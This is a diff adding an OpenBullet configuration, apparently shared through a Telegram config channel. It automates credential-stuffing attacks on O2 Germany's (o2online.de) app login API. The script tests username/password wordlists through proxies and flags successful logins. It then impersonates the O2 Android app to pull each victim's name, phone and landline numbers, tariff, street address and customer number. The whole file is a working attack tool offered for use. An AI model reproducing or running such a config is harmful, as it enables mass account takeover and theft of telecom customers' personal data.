@@ -1,0 +1,119 @@
+[SETTINGS]
+{
+  "Name": "o2online.de",
+  "SuggestedBots": 70,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-09T02:50:55.493827+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@wanted_boy",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://login.o2online.de/applogin/login" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "X-OpenAM-Password: <PASS>" 
+  HEADER "X-OpenAM-Username: <USER>" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_0_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/16A404" 
+  HEADER "Accept-API-Version: resource=2.0, protocol=1.0" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication Failed" 
+  KEYCHAIN Success OR 
+    KEY "successUrl" 
+
+#rnd FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "rnd" 
+
+#Get REQUEST GET "https://apps.o2online.de/apps2mce/services/brands/o2/subscriptions_authorized" 
+  
+  HEADER "Host: apps.o2online.de" 
+  HEADER "X-O2app-Serviceversion: 2" 
+  HEADER "X-Box7-Clientid: b2c-apps" 
+  HEADER "X-Box7-Requestid: <rnd>" 
+  HEADER "X-Box7-Clientconfig: headerVersion=1, osVersion=7.1.2, brand=o2, os=ANDROID, appVersion=7.14.1" 
+  HEADER "User-Agent: Myo2App_Android_7.14.1" 
+  HEADER "Accept-Charset: utf-8" 
+  HEADER "Accept-Language: de-de" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#firstName PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "firstName" 
+
+#lastName PARSE "<SOURCE>" JSON "lastName" CreateEmpty=FALSE -> CAP "lastName" 
+
+#phoneNumber PARSE "<SOURCE>" JSON "msisdn" CreateEmpty=FALSE -> CAP "phoneNumber" 
+
+#ndc PARSE "<SOURCE>" JSON "ndc" -> VAR "ndc" 
+
+#subscriberNumber PARSE "<SOURCE>" JSON "subscriberNumber" -> VAR "subscriberNumber" 
+
+#festnetznummer FUNCTION Constant "<ndc> <subscriberNumber>" -> CAP "festnetznummer" 
+
+#plan PARSE "<SOURCE>" JSON "releaseName" CreateEmpty=FALSE -> CAP "plan" 
+
+#subscriptionId PARSE "<SOURCE>" JSON "subscriptionId" -> VAR "subscriptionId" 
+
+#rnd2 FUNCTION RandomString "?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h?h" -> VAR "rnd2" 
+
+#Get REQUEST GET "https://apps.o2online.de/apps2mce/services/brands/o2/subscriptions/<subscriptionId>/customers" 
+  
+  HEADER "Host: apps.o2online.de" 
+  HEADER "X-O2app-Serviceversion: 4" 
+  HEADER "X-Box7-Clientid: b2c-apps" 
+  HEADER "X-Box7-Requestid: <rnd2>" 
+  HEADER "X-Box7-Clientconfig: headerVersion=1, osVersion=7.1.2, brand=o2, os=ANDROID, appVersion=7.14.1" 
+  HEADER "User-Agent: Myo2App_Android_7.14.1" 
+  HEADER "Accept-Charset: utf-8" 
+  HEADER "Accept-Language: de-de" 
+  HEADER "Accept: application/json" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+#zipCode PARSE "<SOURCE>" JSON "zip" CreateEmpty=FALSE -> CAP "zipCode" 
+
+#city PARSE "<SOURCE>" JSON "city" CreateEmpty=FALSE -> CAP "city" 
+
+#street PARSE "<SOURCE>" JSON "street" CreateEmpty=FALSE -> CAP "street" 
+
+#houseNumber PARSE "<SOURCE>" JSON "houseNumber" CreateEmpty=FALSE -> CAP "houseNumber" 
+
+#customerNumber PARSE "<SOURCE>" JSON "customerNumber" CreateEmpty=FALSE -> CAP "customerNumber" 
+
+#info PARSE "<SOURCE>" LR "mySubscription\":true,\"status\":\"ACTIVE\",\"" "LANDLINE" -> VAR "info" 
+
+#ndcl PARSE "<info>" LR "ndc\":\"" "\"" -> VAR "ndcl" 
+
+#sl PARSE "<info>" LR "subscriberNumber\":\"" "\"" -> VAR "sl" 
+
+#LANDLINE FUNCTION Constant "<ndcl><sl>" -> CAP "LANDLINE" 
+
+SET CAP "Author Telegram" "@wanted_boy"
+SET CAP "Telegram Channel" "https://t.me/OpenBulletConfigs"
+
